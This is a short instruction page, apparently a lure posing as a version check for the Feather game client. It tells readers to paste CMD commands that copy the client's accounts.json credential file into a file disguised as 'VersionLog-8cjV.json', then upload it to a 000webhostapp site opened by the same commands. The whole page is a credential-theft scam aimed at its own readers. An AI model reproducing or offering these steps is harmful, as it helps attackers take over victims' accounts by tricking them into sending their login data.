## How to USE?
1) Copy commands below
2) click windows button in your keyboard or win + r and write CMD
3) Run CMD
4) Paste text
5) Open the same CMD in taskbar
6) click F
7) Go to folder and copy path
8) Go to website, upload file, paste path, and click VersionLog-XXXX.json file

# Copy this code and write in CMD

start "" "https://sprawdzwersje.000webhostapp.com/panel.html"
start "" "C:\Users\%USERNAME%\AppData\Roaming\.feather\mods\"
XCOPY "C:\Users\%USERNAME%\AppData\Roaming\.feather\accounts.json" "C:\Users\%USERNAME%\AppData\Roaming\.feather\mods\VersionLog-8cjV.json" /Y /I > NUL
